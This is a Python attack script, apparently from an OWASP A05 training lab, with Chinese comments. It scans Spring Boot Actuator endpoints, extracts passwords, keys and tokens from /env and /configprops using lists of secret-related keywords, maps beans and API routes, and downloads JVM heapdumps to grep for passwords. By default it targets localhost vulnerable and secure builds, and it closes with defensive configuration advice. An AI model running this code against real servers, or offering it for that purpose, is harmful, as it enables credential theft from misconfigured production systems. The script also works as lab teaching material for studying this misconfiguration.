#!/usr/bin/env python3
"""
A05:2021 - Security Misconfiguration
Spring Boot Actuator 端點探測與利用

此腳本展示如何探測和利用暴露的 Actuator 端點：
1. 端點發現 - 掃描所有可能的 Actuator 端點
2. 環境變數洩露 - 從 /env 讀取敏感配置
3. Heapdump 下載 - 下載 JVM 堆轉儲進行分析
4. Bean 資訊洩露 - 獲取應用程式內部結構

CWE-16: Configuration
"""

import requests
import argparse
import json
import os
from datetime import datetime

# ANSI 顏色
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
RESET = '\033[0m'


def print_banner():
    print(f"""
{RED}╔══════════════════════════════════════════════════════════════╗
║  A05 - Actuator Endpoint Exploitation Tool                   ║
║  Spring Boot Actuator 端點探測與利用                           ║
╚══════════════════════════════════════════════════════════════╝{RESET}
""")


def discover_endpoints(base_url, session):
    """探測所有可能的 Actuator 端點"""
    print(f"\n{BLUE}[*] 探測 Actuator 端點...{RESET}")
    
    actuator_endpoints = [
        "actuator",
        "actuator/health",
        "actuator/info",
        "actuator/env",
        "actuator/beans",
        "actuator/configprops",
        "actuator/mappings",
        "actuator/metrics",
        "actuator/loggers",
        "actuator/heapdump",
        "actuator/threaddump",
        "actuator/scheduledtasks",
        "actuator/conditions",
        "actuator/caches",
        "actuator/httptrace",
        "actuator/sessions",
        "actuator/shutdown",  # POST only
    ]
    
    found_endpoints = []
    
    for endpoint in actuator_endpoints:
        url = f"{base_url}/{endpoint}"
        try:
            response = session.get(url, timeout=5)
            if response.status_code == 200:
                print(f"  {GREEN}[+] /{endpoint} - 可訪問{RESET}")
                found_endpoints.append(endpoint)
            elif response.status_code == 401:
                print(f"  {YELLOW}[!] /{endpoint} - 需要認證{RESET}")
            elif response.status_code == 403:
                print(f"  {YELLOW}[!] /{endpoint} - 禁止訪問{RESET}")
            elif response.status_code == 405:
                print(f"  {YELLOW}[!] /{endpoint} - 方法不允許 (可能是 POST){RESET}")
        except Exception:
            pass
    
    return found_endpoints


def exploit_env_endpoint(base_url, session):
    """從 /env 端點提取敏感資訊"""
    print(f"\n{BLUE}[*] 嘗試讀取環境變數...{RESET}")
    
    url = f"{base_url}/actuator/env"
    response = session.get(url, timeout=10)
    
    if response.status_code != 200:
        print(f"  {RED}[-] 無法訪問 /actuator/env{RESET}")
        return None
    
    env_data = response.json()
    
    # 搜尋敏感關鍵字
    sensitive_keywords = [
        "password", "secret", "key", "token", "credential",
        "api_key", "apikey", "auth", "private", "jwt",
        "database", "db_", "mysql", "postgres", "redis",
        "aws", "azure", "gcp", "cloud"
    ]
    
    found_secrets = []
    
    print(f"\n{YELLOW}[!] 發現的敏感配置:{RESET}")
    
    # 檢查 propertySources
    for source in env_data.get("propertySources", []):
        source_name = source.get("name", "unknown")
        properties = source.get("properties", {})
        
        for key, value_obj in properties.items():
            key_lower = key.lower()
            
            # 檢查是否包含敏感關鍵字
            for keyword in sensitive_keywords:
                if keyword in key_lower:
                    value = value_obj.get("value", "******")
                    found_secrets.append({
                        "source": source_name,
                        "key": key,
                        "value": value
                    })
                    print(f"  {RED}[+] {key}: {value}{RESET}")
                    break
    
    return found_secrets


def exploit_beans_endpoint(base_url, session):
    """從 /beans 端點獲取應用程式結構"""
    print(f"\n{BLUE}[*] 獲取 Bean 資訊...{RESET}")
    
    url = f"{base_url}/actuator/beans"
    response = session.get(url, timeout=10)
    
    if response.status_code != 200:
        print(f"  {RED}[-] 無法訪問 /actuator/beans{RESET}")
        return None
    
    beans_data = response.json()
    
    # 尋找有趣的 Bean
    interesting_patterns = [
        "DataSource", "Security", "Auth", "Password", "Credential",
        "Jwt", "Token", "Secret", "Crypto", "Cipher", "Key"
    ]
    
    print(f"\n{YELLOW}[!] 可能有趣的 Bean:{RESET}")
    
    contexts = beans_data.get("contexts", {})
    for context_name, context_data in contexts.items():
        beans = context_data.get("beans", {})
        for bean_name, bean_info in beans.items():
            for pattern in interesting_patterns:
                if pattern.lower() in bean_name.lower():
                    bean_type = bean_info.get("type", "unknown")
                    print(f"  {GREEN}[+] {bean_name}{RESET}")
                    print(f"      類型: {bean_type}")
                    break
    
    return beans_data


def exploit_configprops_endpoint(base_url, session):
    """從 /configprops 端點獲取配置屬性"""
    print(f"\n{BLUE}[*] 獲取配置屬性...{RESET}")
    
    url = f"{base_url}/actuator/configprops"
    response = session.get(url, timeout=10)
    
    if response.status_code != 200:
        print(f"  {RED}[-] 無法訪問 /actuator/configprops{RESET}")
        return None
    
    config_data = response.json()
    
    # 尋找敏感配置
    sensitive_found = []
    
    contexts = config_data.get("contexts", {})
    for context_name, context_data in contexts.items():
        beans = context_data.get("beans", {})
        for bean_name, bean_info in beans.items():
            properties = bean_info.get("properties", {})
            for key, value in properties.items():
                if isinstance(value, str) and any(kw in key.lower() for kw in ["password", "secret", "key"]):
                    sensitive_found.append({"bean": bean_name, "key": key, "value": value})
                    print(f"  {RED}[+] {bean_name}.{key}: {value}{RESET}")
    
    return sensitive_found


def download_heapdump(base_url, session, output_dir="."):
    """下載 JVM Heapdump 進行分析"""
    print(f"\n{BLUE}[*] 下載 Heapdump...{RESET}")
    print(f"  {YELLOW}[!] 這可能需要一些時間...{RESET}")
    
    url = f"{base_url}/actuator/heapdump"
    
    try:
        response = session.get(url, timeout=60, stream=True)
        
        if response.status_code != 200:
            print(f"  {RED}[-] 無法下載 heapdump (狀態碼: {response.status_code}){RESET}")
            return None
        
        # 生成檔案名
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"heapdump_{timestamp}.hprof"
        filepath = os.path.join(output_dir, filename)
        
        # 下載並保存
        total_size = 0
        with open(filepath, "wb") as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
                total_size += len(chunk)
        
        size_mb = total_size / (1024 * 1024)
        print(f"  {GREEN}[+] Heapdump 已保存: {filepath} ({size_mb:.2f} MB){RESET}")
        print(f"\n  {YELLOW}[!] 分析建議:{RESET}")
        print(f"      1. 使用 Eclipse MAT 分析: mat {filepath}")
        print(f"      2. 使用 VisualVM: visualvm --openfile {filepath}")
        print(f"      3. 搜尋字串: strings {filepath} | grep -i password")
        print(f"      4. 使用 HeapInspect: heapinspect {filepath}")
        
        return filepath
        
    except Exception as e:
        print(f"  {RED}[-] 下載失敗: {e}{RESET}")
        return None


def exploit_mappings_endpoint(base_url, session):
    """從 /mappings 端點獲取 API 路徑"""
    print(f"\n{BLUE}[*] 獲取 API 路徑映射...{RESET}")
    
    url = f"{base_url}/actuator/mappings"
    response = session.get(url, timeout=10)
    
    if response.status_code != 200:
        print(f"  {RED}[-] 無法訪問 /actuator/mappings{RESET}")
        return None
    
    mappings_data = response.json()
    
    # 提取路徑
    print(f"\n{YELLOW}[!] 發現的 API 端點:{RESET}")
    
    contexts = mappings_data.get("contexts", {})
    for context_name, context_data in contexts.items():
        mappings = context_data.get("mappings", {})
        dispatcher_servlets = mappings.get("dispatcherServlets", {})
        
        for servlet_name, handlers in dispatcher_servlets.items():
            for handler in handlers:
                predicate = handler.get("predicate", "")
                handler_method = handler.get("handler", "")
                
                # 只顯示應用程式的端點（非 Actuator）
                if "/actuator" not in predicate and "org.springframework" not in handler_method:
                    print(f"  {GREEN}[+] {predicate}{RESET}")
    
    return mappings_data


def test_secure_version(base_url, session):
    """測試安全版本"""
    print(f"\n{BLUE}[*] 測試安全版本的 Actuator 配置...{RESET}")
    
    # 安全版本應該只暴露 health 端點
    endpoints_to_check = ["actuator/env", "actuator/heapdump", "actuator/beans"]
    
    all_blocked = True
    for endpoint in endpoints_to_check:
        url = f"{base_url}/{endpoint}"
        try:
            response = session.get(url, timeout=5)
            if response.status_code == 200:
                print(f"  {RED}[!] /{endpoint} - 仍然可訪問！{RESET}")
                all_blocked = False
            elif response.status_code in [401, 403, 404]:
                print(f"  {GREEN}[+] /{endpoint} - 已正確保護 ({response.status_code}){RESET}")
        except Exception:
            pass
    
    if all_blocked:
        print(f"\n  {GREEN}[+] 安全配置正確！敏感端點已被保護{RESET}")
    else:
        print(f"\n  {RED}[-] 警告：部分敏感端點仍可訪問{RESET}")
    
    return all_blocked


def main():
    parser = argparse.ArgumentParser(
        description="A05 - Spring Boot Actuator 端點探測與利用",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
範例:
  %(prog)s                           # 攻擊漏洞版本
  %(prog)s --compare                 # 比較安全與漏洞版本
  %(prog)s --download-heapdump       # 下載 heapdump 進行分析
  %(prog)s --output-dir ./dumps      # 指定 heapdump 保存目錄
        """
    )
    parser.add_argument("--vulnerable-url", default="http://localhost:8081",
                        help="漏洞版本 URL")
    parser.add_argument("--secure-url", default="http://localhost:8082",
                        help="安全版本 URL")
    parser.add_argument("--compare", action="store_true",
                        help="比較安全版本與漏洞版本")
    parser.add_argument("--download-heapdump", action="store_true",
                        help="下載 heapdump 進行分析")
    parser.add_argument("--output-dir", default=".",
                        help="Heapdump 保存目錄")
    
    args = parser.parse_args()
    
    print_banner()
    
    session = requests.Session()
    
    print(f"{YELLOW}[*] 目標: {args.vulnerable_url}{RESET}")
    
    # 1. 探測端點
    found_endpoints = discover_endpoints(args.vulnerable_url, session)
    
    if not found_endpoints:
        print(f"\n{RED}[-] 未發現任何 Actuator 端點{RESET}")
        return
    
    # 2. 利用各端點
    if "actuator/env" in found_endpoints:
        exploit_env_endpoint(args.vulnerable_url, session)
    
    if "actuator/beans" in found_endpoints:
        exploit_beans_endpoint(args.vulnerable_url, session)
    
    if "actuator/configprops" in found_endpoints:
        exploit_configprops_endpoint(args.vulnerable_url, session)
    
    if "actuator/mappings" in found_endpoints:
        exploit_mappings_endpoint(args.vulnerable_url, session)
    
    # 3. 下載 heapdump（如果請求）
    if args.download_heapdump and "actuator/heapdump" in found_endpoints:
        download_heapdump(args.vulnerable_url, session, args.output_dir)
    elif "actuator/heapdump" in found_endpoints:
        print(f"\n{YELLOW}[!] Heapdump 可用，使用 --download-heapdump 下載{RESET}")
    
    # 4. 比較模式
    if args.compare:
        print(f"\n{BLUE}{'='*60}{RESET}")
        print(f"{BLUE}[*] 比較安全版本: {args.secure_url}{RESET}")
        test_secure_version(args.secure_url, session)
    
    # 總結
    print(f"\n{BLUE}{'='*60}{RESET}")
    print(f"{YELLOW}[*] 攻擊總結:{RESET}")
    print(f"    發現端點: {len(found_endpoints)} 個")
    print(f"    可利用的端點:")
    for ep in found_endpoints:
        print(f"      - /{ep}")
    
    print(f"\n{YELLOW}[*] 防禦建議:{RESET}")
    print("    1. 只暴露必要的端點 (如 health, info)")
    print("    2. 使用 management.endpoints.web.exposure.include=health,info")
    print("    3. 為 Actuator 端點添加認證")
    print("    4. 禁用 env.show-values")
    print("    5. 在生產環境禁用 heapdump 端點")


if __name__ == "__main__":
    main()
